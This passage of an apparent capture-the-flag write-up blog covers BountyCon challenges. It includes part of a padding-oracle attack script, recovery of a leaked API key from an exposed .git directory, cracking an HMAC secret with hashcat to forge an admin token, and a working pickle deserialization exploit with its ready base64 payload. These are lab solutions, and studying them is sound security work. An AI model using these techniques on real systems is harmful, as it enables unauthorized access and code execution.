    <span class="k">def</span> <span class="nf">oracle</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[*] Trying: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)))</span>

        <span class="c1"># Do Crypto that throws something different if padding error
</span>        <span class="c1"># r = requests.post('http://crypto.chal.csaw.io:8001/', data={'matrix-id':b64encode(data)})
</span>        <span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPSConnection</span><span class="p">(</span><span class="s">"m2qglk5s8i.execute-api.eu-west-2.amazonaws.com"</span><span class="p">)</span>
        <span class="n">encoded</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="n">url_encoded</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"/default/c2v53m?msg="</span> <span class="o">+</span> <span class="n">url_encoded</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
        <span class="n">data</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
        <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="s">'padding'</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"[*] Padding error!"</span><span class="p">)</span>
            <span class="k">raise</span> <span class="n">BadPaddingException</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"[*] No padding error"</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="kn">import</span> <span class="nn">logging</span>
    <span class="kn">import</span> <span class="nn">sys</span>

    <span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">)</span>
    <span class="c1"># This is a random string the server printed for us, 
</span>    <span class="c1"># assuming have to decrypt this, and see what we get
</span>    <span class="n">encrypted_value</span> <span class="o">=</span> <span class="s">'5Hr1Y8IQMJ+HpmIXhr8dwDd8YO8h/3JG5OEfwtt7zAwBIDWKwbI52ECM6iQ='</span>
    <span class="n">padbuster</span> <span class="o">=</span> <span class="n">PadBuster</span><span class="p">()</span>

    <span class="n">value</span> <span class="o">=</span> <span class="n">padbuster</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted_value</span><span class="p">),</span> <span class="n">block_size</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="nb">bytearray</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>

    <span class="k">print</span><span class="p">(</span><span class="s">'Decrypted: </span><span class="si">%</span><span class="s">s =&gt; </span><span class="si">%</span><span class="s">r'</span> <span class="o">%</span> <span class="p">(</span><span class="n">encrypted_value</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>
</code></pre></div></div>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="gluebar">Glue.bar</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ever wanted to share 20 KiB of text (or less) with a friend but just couldn't? Enter Glue.bar, the original text-sharing application!

https://www.glue.bar/
</code></pre></div></div>

<p>You can check how the website looks like by opening it. From the website, it looks like a flag is stored in glue and we have to found that glue id.</p>

<p>Two things got my attention.</p>

<p>First, star supporters can see glue without a direct link.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Are my glues visible to other users?

Only our star supporters can see glues without a direct link.

</code></pre></div></div>

<p><img src="/images/Screenshot_17.png" alt="" class="img-responsive" /></p>

<p>Second, Glue.bar has API as well.</p>

<p><img src="/images/Screenshot_18.png" alt="" class="img-responsive" /></p>

<p>I opened <code class="highlighter-rouge">api.glue.bar</code> but we don’t have the API key.</p>

<p><img src="/images/Screenshot_19.png" alt="" class="img-responsive" /></p>

<p>After viewing the SSL certificate of glue.bar , I came to know a few of its subdomains</p>

<p><img src="/images/Screenshot_20.png" alt="" class="img-responsive" /></p>

<p>From which one is <code class="highlighter-rouge">starclient.glue.bar</code></p>

<p>I opened it looks something like this</p>

<p><img src="/images/Screenshot_21.png" alt="" class="img-responsive" /></p>

<p>I downloaded the code provided in the starclient.glue.bar which was</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span><span class="p">,</span> <span class="n">request</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span> <span class="o">=</span> <span class="s">"Glue.bar API client"</span><span class="p">)</span>
<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--url"</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"apiUrl"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"API endpoint location"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--key"</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"apiKey"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"API key"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">subparsers</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">add_subparsers</span><span class="p">(</span><span class="n">dest</span><span class="o">=</span><span class="s">"command"</span><span class="p">)</span>

<span class="n">parser_get</span> <span class="o">=</span> <span class="n">subparsers</span><span class="o">.</span><span class="n">add_parser</span><span class="p">(</span><span class="s">"get"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"get glue by ID"</span><span class="p">)</span>
<span class="n">parser_get</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"glueId"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"ID of glue to retrieve"</span><span class="p">)</span>

<span class="n">parser_browse</span> <span class="o">=</span> <span class="n">subparsers</span><span class="o">.</span><span class="n">add_parser</span><span class="p">(</span><span class="s">"browse"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"show glues according to filters"</span><span class="p">)</span>
<span class="n">parser_browse</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--author"</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"author"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"filter by author"</span><span class="p">)</span>
<span class="n">parser_browse</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"--title"</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s">"title"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"filter by title"</span><span class="p">)</span>

<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span> <span class="o">==</span> <span class="s">"get"</span><span class="p">:</span>
  <span class="n">params</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span>
    <span class="s">"key"</span><span class="p">:</span> <span class="n">args</span><span class="o">.</span><span class="n">apiKey</span><span class="p">,</span>
    <span class="s">"action"</span><span class="p">:</span> <span class="s">"get"</span><span class="p">,</span>
    <span class="s">"id"</span><span class="p">:</span> <span class="n">args</span><span class="o">.</span><span class="n">glueId</span>
  <span class="p">})</span>
<span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span> <span class="o">==</span> <span class="s">"browse"</span><span class="p">:</span>
  <span class="n">filters</span> <span class="o">=</span> <span class="p">[]</span>
  <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">author</span><span class="p">:</span>
    <span class="n">filters</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="s">"author"</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">author</span><span class="p">])</span>
  <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">title</span><span class="p">:</span>
    <span class="n">filters</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="s">"title"</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">title</span><span class="p">])</span>
  <span class="n">params</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span>
    <span class="s">"key"</span><span class="p">:</span> <span class="n">args</span><span class="o">.</span><span class="n">apiKey</span><span class="p">,</span>
    <span class="s">"action"</span><span class="p">:</span> <span class="s">"browse"</span><span class="p">,</span>
    <span class="s">"filters"</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">filters</span><span class="p">)</span>
  <span class="p">})</span>
<span class="k">else</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"No command selected!"</span><span class="p">)</span>
  <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">apiUrl</span><span class="p">,</span> <span class="n">params</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">))</span>

<span class="k">if</span> <span class="ow">not</span> <span class="n">response</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">response</span><span class="p">[</span><span class="s">"success"</span><span class="p">]:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Request failed!"</span><span class="p">)</span>
  <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="p">[</span><span class="s">"data"</span><span class="p">]</span>

<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span> <span class="o">==</span> <span class="s">"get"</span><span class="p">:</span>
  <span class="k">if</span> <span class="n">response</span><span class="p">[</span><span class="s">"data"</span><span class="p">]</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Glue not found!"</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Glue found:"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"==========="</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Created: "</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="s">"created_at"</span><span class="p">])</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Author:  "</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="s">"author"</span><span class="p">])</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Title:   "</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="s">"title"</span><span class="p">])</span>
  <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="s">"content"</span><span class="p">])</span>
<span class="k">else</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Results:"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"========"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"link             | author | title"</span><span class="p">)</span>
  <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">entry</span><span class="p">[</span><span class="s">"link"</span><span class="p">]</span> <span class="o">+</span> <span class="s">" | "</span> <span class="o">+</span> <span class="n">entry</span><span class="p">[</span><span class="s">"author"</span><span class="p">]</span> <span class="o">+</span> <span class="s">" | "</span> <span class="o">+</span> <span class="n">entry</span><span class="p">[</span><span class="s">"title"</span><span class="p">])</span>

</code></pre></div></div>

<p>It has no information about the API key. It’s telling us how to use their API.
I started finding directories in the starclient.glue.bar and found .git directory.
On opening <code class="highlighter-rouge">https://starclient.glue.bar/.git/</code> it giving <code class="highlighter-rouge">403 Forbidden</code> Error</p>

<p><img src="/images/Screenshot_22.png" alt="" class="img-responsive" /></p>

<p>I started finding directories in the starclient.glue.bar/.git/ and found interesting files.</p>

<p><img src="/images/Screenshot_23.png" alt="" class="img-responsive" /></p>

<p>I used a gitdumper to get the .git files.</p>

<p><img src="/images/Screenshot_24.png" alt="" class="img-responsive" /></p>

<p>I found some old commit files. One of them containing the API key.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span><span class="p">,</span> <span class="n">request</span>

<span class="n">apiUrl</span> <span class="o">=</span> <span class="s">"http://localhost:1234/"</span>
<span class="n">apiKey</span> <span class="o">=</span> <span class="s">"6it1vbsfhn8odbrm71odj8e0h0rbeng0rybxornl"</span>
<span class="n">glueId</span> <span class="o">=</span> <span class="s">"8rqowk3l327jv6pe"</span>

<span class="n">params</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span>
  <span class="s">"key"</span><span class="p">:</span> <span class="n">apiKey</span><span class="p">,</span>
  <span class="s">"action"</span><span class="p">:</span> <span class="s">"get"</span><span class="p">,</span>
  <span class="s">"id"</span><span class="p">:</span> <span class="n">glueId</span>
<span class="p">})</span>

<span class="k">print</span><span class="p">(</span><span class="n">params</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>

<span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">Request</span><span class="p">(</span><span class="n">apiUrl</span><span class="p">,</span> <span class="n">params</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">))</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">response</span><span class="p">))</span>

</code></pre></div></div>

<p>I used API to find any glue with title and author with keywords like bountycon etc but there was no flag with these keywords.</p>

<p>So, I decided to brute force the parameters and found the parameter <code class="highlighter-rouge">id</code> was accepting values.
Tried <code class="highlighter-rouge">3</code> for id parameter and got the flag. saying <code class="highlighter-rouge">Have yourself a flag</code></p>

<p><img src="/images/Screenshot_25.png" alt="" class="img-responsive" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="i-dont-play">I Don’t Play</h1>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2
</code></pre></div></div>

<p>On opening the website it looked like</p>

<p><img src="/images/Screenshot_26.png" alt="" class="img-responsive" /></p>

<p>Clicking on <code class="highlighter-rouge">login</code> redirects to another website.</p>

<p><img src="/images/Screenshot_27.png" alt="" class="img-responsive" /></p>

<p>On checking the source code of the page, it says <code class="highlighter-rouge">&lt;!-- AUTH_TOKEN=url_encode(username;base64(hmac-sha256(username))) --&gt;</code></p>

<p><img src="/images/Screenshot_28.png" alt="" class="img-responsive" /></p>

<p>Clicking on cancel leads us to <code class="highlighter-rouge">https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2?AUTH_TOKEN=%3BFZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8%3D</code></p>

<p>URL decode the following <code class="highlighter-rouge">%3BFZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8%3D</code> leads to <code class="highlighter-rouge">;FZbocBdRNUdHNe2sYnCX05OsnSbRqtPRscvllzbLTB8=</code> before <code class="highlighter-rouge">;</code> is username which is empty and then hmac-sha256 is done on username with some password which we dont know. But what if password is weak. Let’s bruteforce it.</p>

<p>I used hashcat with <code class="highlighter-rouge">rockyou.txt</code> file and found the password which was <code class="highlighter-rouge">ilovefacebook</code></p>

<p><img src="/images/Screenshot_29.png" alt="" class="img-responsive" /></p>

<p>I made the hmac-sha256 for <code class="highlighter-rouge">admin</code> using the password <code class="highlighter-rouge">ilovefacebook</code> and entered that hash to AUTH_TOKEN parameter e.g <code class="highlighter-rouge">https://ik6939fg0f.execute-api.eu-west-2.amazonaws.com/default/qx9nc2?AUTH_TOKEN=mEE3YZsG%2FlrlYlmdMlK8tqmA8CKWRwTr9%2FNDcipJF4c%3D</code> which gave us the flag.</p>

<p><img src="/images/Screenshot_30.png" alt="" class="img-responsive" /></p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="tick-tock">Tick Tock</h1>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Time's ticking, hack me before it's too late.

https://mk3pxi9jwe.execute-api.eu-west-2.amazonaws.com/default/s2vx5m

tick_tock.tar.gz
</code></pre></div></div>

<p><a href="/files/tick_tock.tar.gz">Link to the file</a></p>

<p>In the challenge, a file was given to us which was like</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">function_shield</span>

<span class="n">function_shield</span><span class="o">.</span><span class="n">configure</span><span class="p">({</span>
    <span class="s">"policy"</span><span class="p">:</span> <span class="p">{</span>
        <span class="c1"># 'block' mode =&gt; active blocking
</span>        <span class="c1"># 'alert' mode =&gt; log only
</span>        <span class="c1"># 'allow' mode =&gt; allowed, implicitly occurs if key does not exist
</span>        <span class="s">"outbound_connectivity"</span><span class="p">:</span> <span class="s">"block"</span><span class="p">,</span>
        <span class="s">"read_write_tmp"</span><span class="p">:</span> <span class="s">"block"</span><span class="p">,</span>
        <span class="s">"create_child_process"</span><span class="p">:</span> <span class="s">"block"</span><span class="p">,</span>
        <span class="s">"read_handler"</span><span class="p">:</span> <span class="s">"block"</span>
    <span class="p">},</span>
    <span class="s">"token"</span><span class="p">:</span> <span class="s">"XXXXXXXX"</span><span class="p">,</span>
    <span class="s">"disable_analytics"</span><span class="p">:</span> <span class="s">"true"</span>
<span class="p">})</span>

<span class="k">def</span> <span class="nf">clock_page</span><span class="p">(</span><span class="n">past</span><span class="p">):</span>
    <span class="n">html</span> <span class="o">=</span> <span class="s">'&lt;!DOCTYPE HTML&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;HTML&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;HEAD&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;TITLE&gt;Timer&lt;/TITLE&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;LINK rel="stylesheet" href="https://fonts.googleapis.com/css?family=Orbitron"&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;STYLE&gt;'</span>\
            <span class="o">+</span> <span class="s">'body{background: black;}'</span>\
            <span class="o">+</span> <span class="s">'.clock{position: absolute; top: 50</span><span class="si">%</span><span class="s">; left: 50</span><span class="si">%</span><span class="s">; transform: translateX(-50</span><span class="si">%</span><span class="s">) translateY(-50</span><span class="si">%</span><span class="s">); color: #17D4FE; font-size: 60px; font-family: Orbitron; letter-spacing: 7px;}'</span>\
            <span class="o">+</span> <span class="s">'&lt;/STYLE&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;/HEAD&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;BODY&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;DIV id="timer" class="clock" onload="showTime()"&gt;&lt;/DIV&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;SCRIPT&gt;'</span>\
            <span class="o">+</span> <span class="s">'function showTime(){'</span>\
            <span class="o">+</span> <span class="s">'var future = Date.now() / 1000 | 0;'</span>\
            <span class="o">+</span> <span class="s">'var delta = future - '</span> <span class="o">+</span> <span class="n">past</span> <span class="o">+</span> <span class="s">';'</span>\
            <span class="o">+</span> <span class="s">'var time = delta.toString();'</span>\
            <span class="o">+</span> <span class="s">'document.getElementById("timer").innerText = time;'</span>\
            <span class="o">+</span> <span class="s">'document.getElementById("timer").textContent = time;'</span>\
            <span class="o">+</span> <span class="s">'setTimeout(showTime, 1000);'</span>\
            <span class="o">+</span> <span class="s">'}'</span>\
            <span class="o">+</span> <span class="s">'showTime();'</span>\
            <span class="o">+</span> <span class="s">'&lt;/SCRIPT&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;/BODY&gt;'</span>\
            <span class="o">+</span> <span class="s">'&lt;/HTML&gt;'</span>
    <span class="k">return</span> <span class="n">html</span>

<span class="k">class</span> <span class="nc">Epoch</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ts</span> <span class="o">=</span> <span class="n">timestamp</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s">"BountyCon{[redacted]}"</span>

<span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
    <span class="k">if</span> <span class="p">((</span><span class="s">'multiValueHeaders'</span> <span class="ow">in</span> <span class="n">event</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span> <span class="ow">and</span> <span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">event</span><span class="p">[</span><span class="s">'multiValueHeaders'</span><span class="p">])</span> <span class="o">!=</span> <span class="s">'null'</span><span class="p">)):</span>
        <span class="k">if</span> <span class="p">(</span><span class="s">'cookie'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">event</span><span class="p">[</span><span class="s">'multiValueHeaders'</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">()):</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">event</span><span class="p">[</span><span class="s">'requestContext'</span><span class="p">][</span><span class="s">'path'</span><span class="p">]</span>
            <span class="n">epoch</span> <span class="o">=</span> <span class="n">Epoch</span><span class="p">(</span><span class="s">'{:d}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())))</span>
            <span class="n">cookie</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">epoch</span><span class="p">))</span>
            <span class="k">return</span> <span class="p">{</span>
                <span class="s">'isBase64Encoded'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
                <span class="s">'statusCode'</span><span class="p">:</span> <span class="mi">302</span><span class="p">,</span>
                <span class="s">'headers'</span><span class="p">:</span> <span class="p">{</span>
                    <span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'text/html; charset=utf-8'</span><span class="p">,</span>
                    <span class="s">'Set-Cookie'</span><span class="p">:</span> <span class="n">cookie</span><span class="p">,</span> <span class="c1"># Server time may be different to browser time!
</span>                    <span class="s">'Location'</span><span class="p">:</span> <span class="n">url</span>
                <span class="p">},</span>
                <span class="s">'body'</span><span class="p">:</span> <span class="s">''</span>
            <span class="p">}</span>


    <span class="n">epoch</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">event</span><span class="p">[</span><span class="s">'multiValueHeaders'</span><span class="p">][</span><span class="s">'cookie'</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span>
    <span class="k">return</span> <span class="p">{</span>
        <span class="s">'isBase64Encoded'</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
        <span class="s">'statusCode'</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>
        <span class="s">'headers'</span><span class="p">:</span> <span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'text/html; charset=utf-8'</span><span class="p">},</span>
        <span class="s">'body'</span><span class="p">:</span> <span class="n">clock_page</span><span class="p">(</span><span class="n">epoch</span><span class="o">.</span><span class="n">ts</span><span class="p">)</span>
    <span class="p">}</span>


</code></pre></div></div>

<p>First, file contains the <code class="highlighter-rouge">flag</code> variable which we want to get it. Second, it’s using <code class="highlighter-rouge">pickle</code> which is not secure from object injection.</p>

<p><img src="/images/Screenshot_31.png" alt="" class="img-responsive" /></p>

<p>Now, it’s doing deserialization on the cookie.</p>

<p>Pickle is vulnerable to deserialization attacks so we can execute arbitrary python code.</p>

<p>I used the below script to get the cookie value to get the flag. I used this script on AWS Lambda. As the target server was running on AWS Lambda, classes needed to be the same for exploitation.
My solution uses eval to execute a string.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">pickle</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">pickletools</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="n">flag</span><span class="o">=</span><span class="s">"BountyCon{[secret]}"</span>

<span class="k">class</span> <span class="nc">Epoch</span><span class="p">():</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ts</span><span class="o">=</span><span class="n">timestamp</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="nb">eval</span><span class="p">,</span> <span class="p">(</span><span class="s">"__import__('inspect').currentframe().f_globals['Epoch'](__import__('inspect').currentframe().f_globals['flag'])"</span><span class="p">,))</span>
        
<span class="k">def</span> <span class="nf">lambda_handler</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
    <span class="c1"># TODO implement
</span>    
    <span class="k">print</span><span class="p">(</span><span class="s">"----------------------------------------------------------------------------------------"</span><span class="p">)</span>
    <span class="n">epoch</span> <span class="o">=</span> <span class="n">Epoch</span><span class="p">(</span><span class="s">'123'</span><span class="p">)</span>
    <span class="n">cookie2</span><span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">epoch</span><span class="p">))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Here's your payload: "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">cookie2</span><span class="p">))</span>
    <span class="k">return</span> <span class="p">{</span>
        <span class="s">'statusCode'</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span>
        <span class="s">'body'</span><span class="p">:</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="s">'Hello from Lambda!'</span><span class="p">)</span>
    <span class="p">}</span>


</code></pre></div></div>

<p>which gave us</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gANjYnVpbHRpbnMKZXZhbApxAFhvAAAAX19pbXBvcnRfXygnaW5zcGVjdCcpLmN1cnJlbnRmcmFtZSgpLmZfZ2xvYmFsc1snRXBvY2gnXShfX2ltcG9ydF9fKCdpbnNwZWN0JykuY3VycmVudGZyYW1lKCkuZl9nbG9iYWxzWydmbGFnJ10pcQGFcQJScQMu
</code></pre></div></div>
<p>Enter this value to cookie and send request. Flag will be yours.</p>

<p><br /></p>

<hr />

<p><br /></p>

<h1 id="heart-of-stone">Heart of Stone</h1>
